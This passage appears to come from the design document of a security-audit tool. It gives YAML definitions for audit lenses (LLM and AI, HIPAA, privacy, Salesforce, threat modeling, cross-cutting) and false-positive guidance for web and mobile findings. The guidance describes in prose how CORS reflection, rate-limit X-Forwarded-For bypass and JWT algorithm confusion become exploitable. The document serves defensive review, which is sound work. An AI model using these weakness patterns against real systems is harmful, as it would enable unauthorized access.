    - '**/{mcp,mcp_server,mcp-server}*/**'
    - '**/*mcp*.{py,ts,js}'
    - '**/langgraph.json'
    - '**/{Modelfile,modelfile}'
    - '**/*.ipynb'
    - '**/{requirements,requirements-dev}*.txt'
    - '**/pyproject.toml'
    - '**/package.json'
    - '**/{migrations,schema}/**/*vector*'
    - '**/*.sql'
  signals:
    - 'anthropic'
    - '@anthropic-ai/sdk'
    - 'openai'
    - 'AzureOpenAI'
    - 'ai (Vercel AI SDK) / @ai-sdk/*'
    - 'litellm'
    - 'langchain'
    - 'langchain_core'
    - 'langchain_community'
    - 'langchain_openai'
    - 'langchain_experimental'
    - 'langgraph'
    - 'llama_index / llama-index'
    - 'haystack-ai'
    - 'semantic-kernel'
    - 'pydantic-ai'
    - 'instructor'
    - 'guardrails-ai'
    - 'transformers'
    - 'sentence_transformers'
    - 'torch.load('
    - 'safetensors'
    - 'trust_remote_code=True'
    - 'from_pretrained('
    - 'huggingface_hub / snapshot_download'
    - 'vllm'
    - 'text-generation-inference'
    - 'ollama'
    - 'boto3.client("bedrock-runtime")'
    - 'google.generativeai / google-genai / vertexai'
    - 'chromadb'
    - 'pinecone'
    - 'weaviate-client'
    - 'qdrant_client'
    - 'faiss'
    - 'pgvector / vector(1536) / <=> operator'
    - 'mcp / modelcontextprotocol / FastMCP / @modelcontextprotocol/sdk'
    - 'tools=[ / tool_choice / tool_use / function_call'
    - 'messages=[{"role": "system"'
    - 'system='
    - 'embeddings.create( / embed_documents('
    - 'similarity_search( / as_retriever( / retriever.invoke('
    - 'RecursiveCharacterTextSplitter'
    - 'AgentExecutor / create_agent / create_react_agent'
    - 'PythonREPLTool / PythonAstREPLTool'
    - 'allow_dangerous_code=True / allow_dangerous_requests=True'
    - 'cache_control (prompt caching)'
    - 'store=True (OpenAI Responses API)'
    - 'stream=True with no max_tokens'
owns:
  - prompt-injection
  - model-output-taint-propagation
  - chat-exfiltration-channels
  - tool-call-authority-and-mediation
  - multi-agent-trust-propagation
  - rag-retrieval-authorization
  - derived-store-data-inheritance
  - llm-data-flow-inventory
  - denial-of-wallet-controls
  - model-artifact-provenance
  - mcp-server-trust
  - system-prompt-as-control
defers:
  ssrf-application-path: web-and-api
  xss-and-output-encoding: web-and-api
  injection-sql-nosql-orm: web-and-api
  injection-command-and-template: web-and-api
  rate-limiting-and-request-quotas: web-and-api
  security-headers-and-csp: web-and-api
  secrets-in-browser-bundle: web-and-api
  package-name-squatting: cicd-and-supply-chain
  dependency-pinning-and-lockfiles: cicd-and-supply-chain
  package-dependency-cves: cicd-and-supply-chain
  install-and-lifecycle-scripts: cicd-and-supply-chain
  sbom-generation-and-attachment: cicd-and-supply-chain
  iam-policy-and-privilege-scope: cloud-and-iac
  network-exposure-and-segmentation: cloud-and-iac
  managed-secret-service-configuration: cloud-and-iac
  kms-key-lifecycle-and-policy: cloud-and-iac
  encryption-at-rest-configuration: cloud-and-iac
  symmetric-encryption-and-nonce-handling: crypto-and-key-management
  key-separation-derivation-and-destruction: crypto-and-key-management
  secrets-in-mobile-binary: mobile-app-security
  agentforce-action-authorization: salesforce-platform
  phi-classification: hipaa-and-phi
  baa-coverage-determination: hipaa-and-phi
  phi-access-audit-controls: hipaa-and-phi
  phi-severity-uplift: hipaa-and-phi
  lawful-basis-and-consent-capture: privacy-and-data-protection
  dsr-fulfilment-mechanics: privacy-and-data-protection
  retention-lawfulness-and-deletion-completeness: privacy-and-data-protection
  cross-border-transfer-route: privacy-and-data-protection
  automated-decision-making-rights: privacy-and-data-protection
  trust-boundary-inventory: threat-modeling
  stride-decomposition: threat-modeling
  attack-tree-construction: threat-modeling
frameworks:
  - owasp-llm-top-10
  - cwe
severity_floor: low
---
```

```yaml
---
name: hipaa-and-phi
title: HIPAA and PHI compliance
cross_cutting: false
activates_on:
  paths:
    - '**/*patient*'
    - '**/*phi*'
    - '**/*ehr*'
    - '**/*emr*'
    - '**/*clinical*'
    - '**/*encounter*'
    - '**/*diagnos*'
    - '**/*medication*'
    - '**/*fhir*'
    - '**/*hl7*'
    - '**/*.hl7'
    - '**/*.ccda'
    - '**/*mrn*'
    - '**/*hipaa*'
    - '**/*baa*'
    - '**/*consent*'
    - '**/*deident*'
    - '**/*anonymi*'
    - '**/*claim*'
    - '**/*eligibility*'
    - '**/*x12*'
    - '**/*.edi'
    - '**/*audit*log*'
    - '**/migrations/**/*patient*'
    - '**/db/seeds/**'
    - '**/fixtures/**/*patient*'
    - '**/objects/HealthCloudGA__*/**'
    - '**/index.html'
    - '**/_document.{tsx,jsx}'
    - '**/app/layout.{tsx,jsx}'
    - '**/*gtm*'
    - '**/*tagmanager*'
  signals:
    - 'fhir.resources / fhirclient / fhir-kit-client / @types/fhir / hapi-fhir / org.hl7.fhir'
    - 'hl7apy / python-hl7 / node-hl7-client / nhapi'
    - 'smart-on-fhir, launch/patient, scopes like patient/*.read or user/Observation.read'
    - '@google-cloud/healthcare / google-cloud-healthcare, boto3.client("healthlake"), Azure.Health.Deidentification'
    - 'epic / cerner / oracle-health / athenahealth / redox / metriport / 1up.health / canvas-medical SDKs or base URLs'
    - 'stedi / pyx12 / availity / changehealthcare, X12 837/835/270/271 parsing'
    - 'icd10 / simple_icd_10 / snomed / loinc / cpt / rxnorm / npi lookup libraries'
    - 'column or field names: mrn, medical_record_number, date_of_birth, dob, ssn, member_id, subscriber_id, diagnosis_code, icd10_code, npi'
    - 'HealthCloudGA__ objects, PersonAccount, Salesforce Shield Platform Encryption, Event Monitoring'
    - 'telemetry SDKs on a PHI path: @sentry/*, datadog / dd-trace, logrocket, mixpanel, amplitude, @segment/analytics, posthog, newrelic'
    - 'session replay / heatmap: fullstory, hotjar, clarity.ms, smartlook'
    - 'trackers in markup or bundles: googletagmanager.com/gtm.js, gtag(, connect.facebook.net, fbq(, _fbp, google-analytics.com, googleads'
    - 'messaging clients used with patient data: twilio, @sendgrid/mail, mailgun, boto3 ses, firebase-admin messaging / apns payloads'
    - 'LLM clients on clinical text: anthropic, openai, azure-openai, bedrock-runtime invoke_model'
    - 'literal markers: PHI, ePHI, "business associate", "Safe Harbor", "minimum necessary", "break glass", "break-glass"'
    - 'audit-trail idioms: audit_log, access_log table with actor_id + record_id, pgaudit, CloudTrail data events, trigger-based history tables'
    - 'de-identification idioms: faker + patient, synthea, scrub, redact, tokenize, crosswalk, re-identification key'
owns:
  - phi-classification
  - baa-coverage-determination
  - minimum-necessary
  - phi-deidentification-standard
  - phi-access-audit-controls
  - phi-encryption-sufficiency
  - phi-in-lower-environments
  - breach-notification-exposure
  - hipaa-documentation-retention
  - phi-severity-uplift
defers:
  authz-object-level: web-and-api
  authz-property-level: web-and-api
  error-handling-and-verbose-responses: web-and-api
  application-log-and-url-content: web-and-api
  graphql-api-surface: web-and-api
  ssrf-application-path: web-and-api
  symmetric-encryption-and-nonce-handling: crypto-and-key-management
  tls-and-certificate-validation: crypto-and-key-management
  key-separation-derivation-and-destruction: crypto-and-key-management
  password-hashing-and-kdf-parameters: crypto-and-key-management
  encryption-at-rest-configuration: cloud-and-iac
  object-storage-exposure: cloud-and-iac
  backup-and-replica-configuration: cloud-and-iac
  control-plane-audit-logging: cloud-and-iac
  kms-key-lifecycle-and-policy: cloud-and-iac
  ci-secret-and-token-handling: cicd-and-supply-chain
  privileged-deploy-gate: cicd-and-supply-chain
  prompt-injection: llm-and-ai
  llm-data-flow-inventory: llm-and-ai
  derived-store-data-inheritance: llm-and-ai
  mobile-local-data-storage: mobile-app-security
  mobile-ui-and-notification-leakage: mobile-app-security
  platform-keystore-key-custody: mobile-app-security
  apex-crud-fls-enforcement: salesforce-platform
  salesforce-platform-logging-surface: salesforce-platform
  shield-encryption-caveats: salesforce-platform
  third-party-destination-inventory: privacy-and-data-protection
  processor-contracts-and-dpa: privacy-and-data-protection
  consumer-health-data-outside-hipaa: privacy-and-data-protection
  pseudonymisation-and-reidentification-risk: privacy-and-data-protection
  consent-gating-of-trackers: privacy-and-data-protection
  pci-scope-and-cardholder-data: privacy-and-data-protection
  trust-boundary-inventory: threat-modeling
  exfiltration-path-enumeration: threat-modeling
  stride-decomposition: threat-modeling
frameworks:
  - hipaa-security-rule
  - hipaa-privacy-rule
  - hipaa-breach-notification-rule
  - nist-sp-800-66
  - nist-sp-800-111
  - nist-sp-800-52
  - fips-140
severity_floor: medium   # every finding is either an uplift of another lens's finding or a safeguard gap; anything this lens would rate Low is a program-maturity question and belongs in the "Out of scope but worth verifying" block, not the findings table. This lens is also the only one with a "## Report format override" section in its body.
---
```

```yaml
---
name: privacy-and-data-protection
title: Privacy and data protection
cross_cutting: false
activates_on:
  paths:
    - '**/consent/**'
    - '**/privacy/**'
    - '**/{analytics,tracking,telemetry}/**'
    - '**/*consent*.{ts,tsx,js,jsx,vue,svelte,py,rb,go,java,kt,cs,php}'
    - '**/*cookie*.{ts,tsx,js,jsx,py,rb,go,php}'
    - '**/*{gtm,gtag,pixel,tagmanager,datalayer}*.{ts,js,html}'
    - '**/*{checkout,payment,billing,subscription,card}*.{ts,tsx,js,jsx,py,rb,go,java,kt,php}'
    - '**/webhooks/**/*{stripe,braintree,adyen,paypal,square}*'
    - '**/*{dsar,dsr,data-subject,data-request,privacy-request,subject-access}*'
    - '**/*{account-deletion,delete-account,user-deletion,erasure,purge,anonymize,pseudonymize,retention}*.{ts,tsx,js,py,rb,go,java,kt,sql}'
    - '**/migrations/**/*.{sql,py,rb,ts,js}'
    - '**/{schema.prisma,schema.rb,models.py}'
    - '**/.well-known/gpc.json'
    - '**/{privacy-policy,cookie-policy,legal}*.{md,mdx,html,tsx,jsx}'
  signals:
    - '@iabtcf/core'
    - 'window.__tcfapi'
    - 'window.__gpp'
    - 'OneTrust'
    - 'OptanonConsent'
    - 'Cookiebot'
    - 'usercentrics'
    - 'didomi'
    - 'ketch'
    - 'osano'
    - 'klaro'
    - 'vanilla-cookieconsent'
    - 'react-cookie-consent'
    - "gtag('consent'"
    - 'dataLayer.push'
    - 'IABTCF_TCString'
    - 'Sec-GPC'
    - 'navigator.globalPrivacyControl'
    - '.well-known/gpc.json'
    - 'posthog-js'
    - 'mixpanel-browser'
    - '@amplitude/analytics-browser'
    - '@segment/analytics-next'
    - 'rudder-sdk-js'
    - '@fullstory/browser'
    - 'hotjar'
    - 'clarity.ms'
    - 'logrocket'
    - 'smartlook'
    - 'rrweb'
    - '@sentry/replay'
    - 'fbq('
    - 'ttq.'
    - 'snaptr('
    - '@stripe/stripe-js'
    - '@stripe/react-stripe-js'
    - 'braintree-web'
    - '@adyen/adyen-web'
    - '@paypal/paypal-js'
    - 'stripe.webhooks.constructEvent'
    - 'PaymentIntent'
    - 'card_number'
    - 'cardNumber'
    - 'cvv'
    - 'cvc'
    - '@fingerprintjs/fingerprintjs'
    - 'clientjs'
    - 'canvas.toDataURL'
    - 'deleted_at'
    - 'is_deleted'
    - 'SoftDeletes'
    - 'acts_as_paranoid'
    - 'paranoid: true'
    - '@SQLDelete'
    - 'expireAfterSeconds'
    - 'anonymize('
    - 'pseudonymize('
    - 'exportUserData'
    - 'List-Unsubscribe'
    - 'List-Unsubscribe-Post'
    - 'unsubscribe_token'
    - 'parental_consent'
    - 'age_gate'
    - 'coppa'
    - 'date_of_birth'
    - 'maxmind'
    - 'geoip-lite'
    - 'cf-ipcountry'
    - 'data_residency'
owns:
  - lawful-basis-and-consent-capture
  - consent-gating-of-trackers
  - cookie-lawfulness-and-lifetime
  - collection-side-minimisation
  - third-party-destination-inventory
  - processor-contracts-and-dpa
  - cross-border-transfer-route
  - retention-lawfulness-and-deletion-completeness
  - dsr-fulfilment-mechanics
  - pii-inventory-and-data-map
  - pseudonymisation-and-reidentification-risk
  - pci-scope-and-cardholder-data
  - payment-page-script-authorisation
  - automated-decision-making-rights
  - consumer-health-data-outside-hipaa
  - childrens-data-and-age-assurance
  - marketing-opt-out-mechanics
  - privacy-by-default-settings
  - fingerprinting-and-tracking-techniques
  - personal-data-severity-uplift
defers:
  session-and-cookie-management: web-and-api
  csrf: web-and-api
  application-log-and-url-content: web-and-api
  webhook-handler-integrity: web-and-api
  authz-object-level: web-and-api
  authz-property-level: web-and-api
  third-party-script-integrity-sri: web-and-api
  key-separation-derivation-and-destruction: crypto-and-key-management
  hash-as-pseudonym-reversibility: crypto-and-key-management
  symmetric-encryption-and-nonce-handling: crypto-and-key-management
  object-storage-exposure: cloud-and-iac
  backup-and-replica-configuration: cloud-and-iac
  data-region-inventory: cloud-and-iac
  encryption-at-rest-configuration: cloud-and-iac
  control-plane-audit-logging: cloud-and-iac
  dependency-pinning-and-lockfiles: cicd-and-supply-chain
  artifact-signing-and-provenance-emission: cicd-and-supply-chain
  sbom-generation-and-attachment: cicd-and-supply-chain
  in-app-consent-mechanisms: mobile-app-security
  mobile-local-data-storage: mobile-app-security
  privacy-manifest-and-store-declarations: mobile-app-security
  llm-data-flow-inventory: llm-and-ai
  derived-store-data-inheritance: llm-and-ai
  prompt-injection: llm-and-ai
  apex-crud-fls-enforcement: salesforce-platform
  shield-encryption-caveats: salesforce-platform
  phi-classification: hipaa-and-phi
  minimum-necessary: hipaa-and-phi
  baa-coverage-determination: hipaa-and-phi
  phi-access-audit-controls: hipaa-and-phi
  phi-severity-uplift: hipaa-and-phi
  trust-boundary-inventory: threat-modeling
  exfiltration-path-enumeration: threat-modeling
frameworks:
  - gdpr
  - eprivacy-directive
  - edpb-guidelines
  - ccpa-cpra
  - coppa
  - pci-dss
  - global-privacy-control
  - apple-privacy-manifests
  - google-play-data-safety
severity_floor: low
---
```

```yaml
---
name: salesforce-platform
title: Salesforce platform security
cross_cutting: false
activates_on:
  paths:
    - '**/force-app/**'
    - '**/classes/*.cls'
    - '**/*.cls'
    - '**/*.trigger'
    - '**/*.cls-meta.xml'
    - '**/lwc/**/*.js'
    - '**/lwc/**/*.html'
    - '**/aura/**/*.cmp'
    - '**/aura/**/*.js'
    - '**/pages/*.page'
    - '**/components/*.component'
    - '**/flows/*.flow-meta.xml'
    - '**/objects/**/*.field-meta.xml'
    - '**/permissionsets/*.permissionset-meta.xml'
    - '**/permissionsetgroups/*.permissionsetgroup-meta.xml'
    - '**/profiles/*.profile-meta.xml'
    - '**/sharingRules/*.sharingRules-meta.xml'
    - '**/namedCredentials/*.namedCredential-meta.xml'
    - '**/externalCredentials/*.externalCredential-meta.xml'
    - '**/remoteSiteSettings/*.remoteSite-meta.xml'
    - '**/cspTrustedSites/*.cspTrustedSite-meta.xml'
    - '**/connectedApps/*.connectedApp-meta.xml'
    - '**/customMetadata/*.md-meta.xml'
    - '**/settings/*.settings-meta.xml'
    - '**/sites/*.site-meta.xml'
    - '**/networks/*.network-meta.xml'
    - '**/staticresources/**'
    - '**/scripts/apex/*.apex'
    - 'sfdx-project.json'
    - '**/package.xml'
    - '.forceignore'
  signals:
    - '@AuraEnabled'
    - '@AuraEnabled(cacheable=true)'
    - 'with sharing'
    - 'without sharing'
    - 'inherited sharing'
    - 'Database.query('
    - 'Database.queryWithBinds('
    - 'String.escapeSingleQuotes('
    - 'Security.stripInaccessible('
    - 'WITH USER_MODE'
    - 'WITH SECURITY_ENFORCED'
    - 'AccessLevel.USER_MODE'
    - 'Schema.SObjectType'
    - 'FeatureManagement.checkPermission('
    - '@RestResource'
    - 'RestContext.request'
    - '@InvocableMethod'
    - 'webservice static'
    - 'System.runAs('
    - 'Test.startTest()'
    - 'System.debug('
    - 'Crypto.generateAesKey('
    - 'Database.DMLOptions'
    - 'lwc:dom="manual"'
    - 'aura:unescapedHtml'
    - 'apex:outputText escape="false"'
    - '{!$CurrentPage.parameters'
    - "import { LightningElement } from 'lwc'"
    - '@salesforce/apex/'
    - '@salesforce/schema/'
    - 'lightning/uiRecordApi'
    - 'sfdx-project.json'
    - '@salesforce/sfdx-lwc-jest'
    - '@salesforce/eslint-config-lwc'
    - '@salesforce/eslint-plugin-lwc'
    - '@salesforce/core'
    - '@salesforce/cli'
    - 'jsforce'
    - 'simple-salesforce'
    - 'sf project deploy'
    - 'force:source:deploy'
    - 'SFDX_AUTH_URL'
    - '.sfdx/'
    - '.sf/'
    - 'sfdx-scanner'
    - 'apiVersion in *-meta.xml'
owns:
  - apex-sharing-declaration
  - apex-crud-fls-enforcement
  - soql-sosl-injection
  - apex-entry-point-exposure
  - flow-run-context-and-authz
  - lwc-aura-vf-output-sinks
  - salesforce-redirect-and-trusted-sites
  - named-and-external-credentials
  - connected-app-configuration
  - permission-set-and-profile-grants
  - guest-user-and-site-exposure
  - salesforce-platform-logging-surface
  - shield-encryption-caveats
  - sfdx-deploy-exposure
  - agentforce-action-authorization
  - client-cached-sensitive-state
defers:
  injection-sql-nosql-orm: web-and-api
  injection-command-and-template: web-and-api
  deserialization-and-xxe: web-and-api
  xss-and-output-encoding: web-and-api
  security-headers-and-csp: web-and-api
  cors-policy: web-and-api
  session-and-cookie-management: web-and-api
  open-redirect: web-and-api
  tls-and-certificate-validation: crypto-and-key-management
  oauth-oidc-flow-correctness: crypto-and-key-management
  jwt-jws-and-jwks-verification: crypto-and-key-management
  saml-assertion-validation: crypto-and-key-management
  symmetric-encryption-and-nonce-handling: crypto-and-key-management
  dependency-pinning-and-lockfiles: cicd-and-supply-chain
  ci-secret-and-token-handling: cicd-and-supply-chain
  artifact-signing-and-provenance-emission: cicd-and-supply-chain
  pipeline-scanner-gating: cicd-and-supply-chain
  iam-policy-and-privilege-scope: cloud-and-iac
  managed-secret-service-configuration: cloud-and-iac
  kms-key-lifecycle-and-policy: cloud-and-iac
  prompt-injection: llm-and-ai
  rag-retrieval-authorization: llm-and-ai
  tool-call-authority-and-mediation: llm-and-ai
  secrets-in-mobile-binary: mobile-app-security
  platform-keystore-key-custody: mobile-app-security
  phi-classification: hipaa-and-phi
  phi-access-audit-controls: hipaa-and-phi
  hipaa-documentation-retention: hipaa-and-phi
  phi-severity-uplift: hipaa-and-phi
  lawful-basis-and-consent-capture: privacy-and-data-protection
  dsr-fulfilment-mechanics: privacy-and-data-protection
  pci-scope-and-cardholder-data: privacy-and-data-protection
  personal-data-severity-uplift: privacy-and-data-protection
  stride-decomposition: threat-modeling
  trust-boundary-inventory: threat-modeling
frameworks:
  - salesforce-secure-coding-guide
  - salesforce-lightning-web-security
  - appexchange-security-review
  - owasp-api-top-10
  - cwe
severity_floor: low
---
```

```yaml
---
name: threat-modeling
title: Architecture threat modeling
cross_cutting: false
activates_on:
  paths:
    - '**/ARCHITECTURE.md'
    - '**/DESIGN.md'
    - '**/THREAT_MODEL.md'
    - '**/docs/architecture/**'
    - '**/docs/adr/**/*.md'
    - '**/docs/rfc/**/*.md'
    - '**/docs/design/**/*.md'
    - '**/*.puml'
    - '**/*.drawio'
    - '**/*.mmd'
    - '**/*.bpmn'
    - '**/docker-compose*.y*ml'
    - '**/openapi.y*ml'
    - '**/openapi.json'
    - '**/asyncapi.y*ml'
    - '**/*.proto'
    - 'services/*/Dockerfile'
    - 'apps/*/Dockerfile'
    - 'packages/*/package.json'
    - '**/k8s/**/*.y*ml'
    - '**/helm/**/values.y*ml'
    - '**/manifests/**/*.y*ml'
    - '**/terraform/**/main.tf'
    - '**/*network*policy*.y*ml'
    - '**/*virtualservice*.y*ml'
    - '**/*authorizationpolicy*.y*ml'
  signals:
    - 'Markdown containing mermaid diagram blocks: ```mermaid with graph TD / flowchart / sequenceDiagram / C4Context'
    - 'PlantUML @startuml / @startdot in repo docs'
    - 'docker-compose.yml with 3 or more entries under services:'
    - '3+ top-level directories that each contain their own Dockerfile or entrypoint (multi-deployable repo)'
    - 'Kubernetes manifests with kind: Ingress, kind: NetworkPolicy, or kind: ServiceAccount'
    - 'Service mesh / workload identity: istio.io VirtualService, AuthorizationPolicy, linkerd annotations, spiffe:// IDs, SPIRE'
    - 'openapi: / asyncapi: top-level keys, or .proto files declaring service X { ... }'
    - 'Inter-service transport deps: @grpc/grpc-js, grpcio, kafkajs, confluent-kafka, pika, bullmq, celery, @aws-sdk/client-sqs, @aws-sdk/client-eventbridge'
    - 'Multi-tenancy markers: tenant_id / org_id / account_id columns, Postgres CREATE POLICY (RLS), SET app.current_tenant, per-tenant schema switching'
    - 'Identity brokers spanning components: auth0, @okta/, keycloak, next-auth, passport, oidc-client-ts, openid-client, python-social-auth'
    - 'Webhook receivers plus outbound third-party integrations in the same repo (an organizational trust boundary inside one codebase)'
    - 'Admin and end-user surfaces in one deployable: /admin routes, is_staff, role === "admin", impersonation / "login as user" helpers'
    - 'Literal strings "trust boundary", "threat model", "STRIDE", "DFD", "data flow diagram" anywhere in docs or ADRs'
    - 'User prompt supplies a diagram, topology description, or design proposal instead of code'
owns:
  - trust-boundary-inventory
  - attacker-profile-model
  - stride-decomposition
  - attack-tree-construction
  - cross-boundary-attribution-logging
  - pivot-feasibility
  - exfiltration-path-enumeration
  - architecture-trust-design-gaps
  - threat-detectability-gap
defers:
  authz-object-level: web-and-api
  authz-function-level: web-and-api
  authentication-and-credential-flows: web-and-api
  rate-limiting-and-request-quotas: web-and-api
  tenant-isolation-enforcement: web-and-api
  injection-sql-nosql-orm: web-and-api
  cors-policy: web-and-api
  csrf: web-and-api
  xss-and-output-encoding: web-and-api
  session-and-cookie-management: web-and-api
  graphql-api-surface: web-and-api
  csprng-and-token-entropy: crypto-and-key-management
  hmac-and-constant-time-comparison: crypto-and-key-management
  jwt-jws-and-jwks-verification: crypto-and-key-management
  key-separation-derivation-and-destruction: crypto-and-key-management
  network-exposure-and-segmentation: cloud-and-iac
  iam-policy-and-privilege-scope: cloud-and-iac
  imds-hardening: cloud-and-iac
  object-storage-exposure: cloud-and-iac
  kubernetes-workload-hardening: cloud-and-iac
  action-and-workflow-ref-pinning: cicd-and-supply-chain
  artifact-signing-and-provenance-emission: cicd-and-supply-chain
  dependency-pinning-and-lockfiles: cicd-and-supply-chain
  pipeline-scanner-gating: cicd-and-supply-chain
  prompt-injection: llm-and-ai
  tool-call-authority-and-mediation: llm-and-ai
  rag-retrieval-authorization: llm-and-ai
  mobile-local-data-storage: mobile-app-security
  certificate-pinning-implementation: mobile-app-security
  deep-link-and-ipc-surface: mobile-app-security
  apex-sharing-declaration: salesforce-platform
  apex-crud-fls-enforcement: salesforce-platform
  connected-app-configuration: salesforce-platform
  flow-run-context-and-authz: salesforce-platform
  phi-access-audit-controls: hipaa-and-phi
  hipaa-documentation-retention: hipaa-and-phi
  phi-severity-uplift: hipaa-and-phi
  pci-scope-and-cardholder-data: privacy-and-data-protection
  retention-lawfulness-and-deletion-completeness: privacy-and-data-protection
  personal-data-severity-uplift: privacy-and-data-protection
frameworks:
  - stride
  - attack-trees
severity_floor: medium   # this lens produces boundary, chain and design output; any threat that resolves to one endpoint or one config line is another lens's finding, and the absence of a threat-model document is Info at most. Below Medium it emits notes, not findings. Its old "## Output format" section is deleted â€” report structure lives in SKILL.md.
---
```

The three cross-cutting lenses run in Phase 2 against the merged finding set, never in the Phase 1 fan-out, which is what empty `activates_on` encodes. `owns: []` plus `defers: {}` is deliberate and CI must special-case it: a cross-cutting lens implicitly defers the entire registry, so every finding it emits carries the `topic` of the owning lens plus its own `raised_by`.

```yaml
---
name: attack-chaining
title: Cross-lens attack chaining
cross_cutting: true
activates_on:
  paths: []
  signals: []
owns: []
defers: {}   # implicitly defers the whole registry; every chain cites component finding IDs and their owners' slugs
frameworks:
  - cwe
severity_floor: high   # a chain exists only to argue that combined findings reach an impact none of them reach alone. If the chain does not land at High or above it adds nothing to the component findings it cites, so it must not be emitted. This is the lens that performs Phase 2 chain elevation; it never creates a new vulnerability, it re-rates existing ones and names the sequence.
---
```

```yaml
---
name: business-logic
title: Business logic and workflow abuse
cross_cutting: true
activates_on:
  paths: []
  signals: []
owns: []
defers: {}   # implicitly defers the whole registry; multi-step abuse is filed against web-and-api's client-trusted-business-rules, race-conditions-and-toctou, or authz-function-level as appropriate
frameworks:
  - owasp-api-top-10
  - cwe
severity_floor: medium   # reasons across handlers about workflow state (coupon stacking, negative quantities, refund and reversal ordering, approval steps skippable by direct call). It files no slug of its own, so a Low-severity note here would be duplicate noise stacked on the owning lens's finding. Below Medium it belongs in the report's observations block.
---
```

```yaml
---
name: completeness
title: Audit completeness critic
cross_cutting: true
activates_on:
  paths: []
  signals: []
owns: []
defers: {}   # audits coverage of the other twelve lenses; asserts nothing about the target code itself
frameworks: []   # measures this lens set against itself, not an external standard
severity_floor: info   # Phase 6 output is coverage and process gaps: an activated lens that returned nothing, a file matched by no lens, a finding dropped without a recorded reason, a Coverage block claim not backed by an auditor result. These are Info by construction. This is the only lens permitted to emit Info-only output, and `info` must therefore be added to the severity_floor enum. A floor of `low` would force it to inflate coverage gaps into vulnerabilities, which would also break the clean-fixture rule that clean/ produces zero findings at Low or above.
---
```

<!-- END SUPERSEDED PROVENANCE — canonical values live in skills/last-aperture/lenses/ -->

## 4. Known-false-positives seed content

Each block below is paste-ready for that lens's `## Known false positives` section. Entries are numbered so the rejected list at the end can reference them. Six entries per lens after dedup â€” every lens's recon set had 8â€“11 candidates, so the cut is selective, not padded. The three cross-cutting lenses (`attack-chaining`, `business-logic`, `completeness`) get no seeds here: they have `owns: []`, so they inherit whatever the owning lens says and their own suppression logic lives in the Phase 2 false-positive sweep, not in a lens body.

Cross-lens ownership resolutions applied while deduping: identifier-in-URL â†’ `hipaa-and-phi`; cross-tenant query with no visible predicate â†’ `web-and-api`; JWT algorithm pinning â†’ `web-and-api`; public-identifier-mistaken-for-credential â†’ `crypto-deep-dive` (with `mobile` keeping the platform-specific variant, because its real finding is a different control); storage-encryption defaults â†’ `cloud-and-iac`.

### `web-and-api`

1. **"Missing CSRF protection" on a JSON API whose only credential is `Authorization: Bearer <token>`.** CSRF requires an ambient credential the browser attaches automatically; a header a hostile origin cannot set, and which forces a CORS preflight the server must opt into, leaves nothing to forge. Even for cookie sessions, Chromium's `SameSite=Lax` default blocks classic cross-site form POSTs, so a missing token on a POST-only Lax-cookie route is defense-in-depth (Low/Medium), not High â€” escalate only when you can name the delivery: a GET-based state change, `SameSite=None`, an attacker-controlled same-site subdomain, or CORS reflecting arbitrary origins with credentials.
2. **`Access-Control-Allow-Origin: *` on a public, unauthenticated endpoint.** The browser refuses to use `*` together with credentials, so a wildcard response can never expose authenticated data â€” on public config, health, docs, or CDN routes it is correct and intentional (Info at most). The exploitable shape is reflection: `cors({origin: true, credentials: true})`, an unanchored regex like `/trusted\.com/` matching `trusted.com.evil.com`, or accepting `Origin: null`.
3. **"IDOR/BOLA" on `findById(params.id)`-shaped code.** Ownership scoping is often structural rather than local: `current_user.orders.find(...)`, a DRF `get_queryset` filter, a Django manager or Hibernate `@Filter`, a repository base class injecting `WHERE org_id = :ctx`, `SET app.tenant_id` plus Postgres RLS, or a Prisma extension. Follow the query chain to the scope before filing â€” but do not *clear* the finding because a scope exists on the read path; check `PATCH`, bulk, and export paths separately, which is where the real bug usually is.
4. **"No authentication on this endpoint" when the guard is registered outside the reviewed file.** `app.use(requireAuth)` before the router mounts, a NestJS global `APP_GUARD`, `dependencies=[Depends(current_user)]` on the `APIRouter`, a Spring `SecurityFilterChain` matcher, `[Authorize]` on a base controller, a Rails `before_action` in `ApplicationController`, or an authenticating gateway all leave the handler bare. Absence of a decorator is not evidence; if the registration cannot be obtained, write it in Notes as an assumption with the verification step. The inverse *is* worth hunting: a route mounted above the middleware, or a `PUBLIC` list that prefix-matches (`/public` also matching `/publications/secret`).
5. **"Missing rate limiting" on login, password reset, or an expensive endpoint.** The limiter is usually terminated before the app â€” Cloudflare/WAF rules, nginx `limit_req`, API Gateway usage plans, Kong/Envoy filters â€” and for login and reset specifically it lives in the IdP (Auth0, Cognito, Okta, Entra ID all throttle and lock out natively). If you do not own the login handler you do not own its limiter: Info-with-a-question unless you can trace the request path end to end. Two variants stay in scope: a limiter keyed on raw `X-Forwarded-For` behind a proxy that does not normalize it (bypassable, real finding), and a limiter that protects the endpoint but not the business flow.
6. **"JWT algorithm not pinned / `alg: none` accepted"** inferred from a `jwt.decode(...)` call, **and "session still valid after logout."** PyJWT â‰¥ 2.0 requires `algorithms=` and raises without it; `jsonwebtoken` â‰¥ 9 infers the permitted family from the key type (a string/Buffer secret admits only `HS*`, a public `KeyObject` only `RS`/`ES`/`PS`), so RS256â†’HS256 confusion and `none` are already blocked; `jose` and `golang-jwt` v5 behave similarly with `WithValidMethods`. Read the library and version before filing a Critical. On logout, a still-valid â‰¤15-minute access token with refresh revocation and rotation is the documented tradeoff of stateless auth â€” it is a finding when the token is long-lived, there is no refresh revocation path, or logout is the only mitigation offered for a stolen token.

### `mobile`

1. **Insecure-looking code inside `if (__DEV__) { ... }`** â€” trust-all TLS, token logging, test credentials, Flipper/Reactotron wiring. Metro inlines `__DEV__` to `false` in a release build and the minifier eliminates the branch, so the code is not in the shipped bundle. Report only the conditions under which it survives: **[CORRECTED 2026-07-27: `minifierEnabled` is NOT a Metro option and never was. `metro-config` defines `minifierConfig`, `minifierPath` and `optimizationSizeLimit`; there is no `minifierEnabled`, and Metro validates config against a known-key schema so the key is silently ignored. Verified absent from every `metro*` and `@expo/metro*` package during the mobile-app-security migration. The artifacts that actually decide this are the Gradle `project.ext.react` / `react { }` `extraPackagerArgs` containing `--dev true` or `--minify false`, the Xcode `bundle-react-native.sh` invocation, the EAS build profile, `expo export --no-minify`, or a custom `transformerPath`/`babelTransformerPath`/serializer. Do not restore the dead literal.]** a custom transformer/serializer, a runtime guard instead of the literal (`if (config.debug)`, `process.env.NODE_ENV !== 'production'` read from remote config), or the same code duplicated outside the guard. Verify against the release bundle.
